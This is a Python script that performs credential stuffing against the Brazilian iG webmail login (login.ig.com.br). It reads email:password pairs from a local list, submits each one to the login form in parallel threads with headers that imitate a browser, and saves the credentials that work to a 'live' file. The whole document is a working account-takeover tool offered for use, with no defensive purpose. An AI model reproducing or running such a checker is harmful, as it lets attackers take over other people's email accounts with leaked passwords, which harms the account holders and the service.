import requests, utils, concurrent.futures
from bs4 import BeautifulSoup

emaillist = "./accounts"
livelist = "./iglive"

def check():
    try:
        account = utils.save.removeFirstLine(emaillist).strip()
        [email, senha] =  account.split(':')
        session = utils.session()
        headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'https://login.ig.com.br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Sec-GPC': '1',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': 'https://login.ig.com.br/skins/param/authmail-ig/form.xhtml?username_id=&message=',
        'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        }
        data = {'returnTo': 'https://login.ig.com.br/webmail/signin','skin': 'webmail-pub-ig','username_id': email,'username_pw': senha}
        resp = session.post('https://login.ig.com.br/signin/', headers=headers, data=data)
        if 'message=invalid_login' in resp.text:
            utils.colors.error("Login inválido")
            utils.save.savetofile(livelist, resp.json()["username"])
        elif 'Para efetuar o desbloqueio, é necessário o pagamento da assinatura.' in resp.text:
            utils.colors.info("Login bloqueado")
        else:
            utils.colors.correct("Login válido")
            utils.save.savetofile(livelist, account)
    except Exception as e:
        utils.colors.info(e)
        utils.save.savetofile(emaillist, account)

if __name__ == "__main__":
    try:
        lista_len = utils.get_len(emaillist)
        utils.colors.correct(f"Loaded {lista_len}x items.")
        with concurrent.futures.ThreadPoolExecutor(max_workers=int(input("Threads: "))) as executor:
            [executor.submit(check) for i in range(0, lista_len, 1)]
    except KeyboardInterrupt:
        pass

input('Acabou.')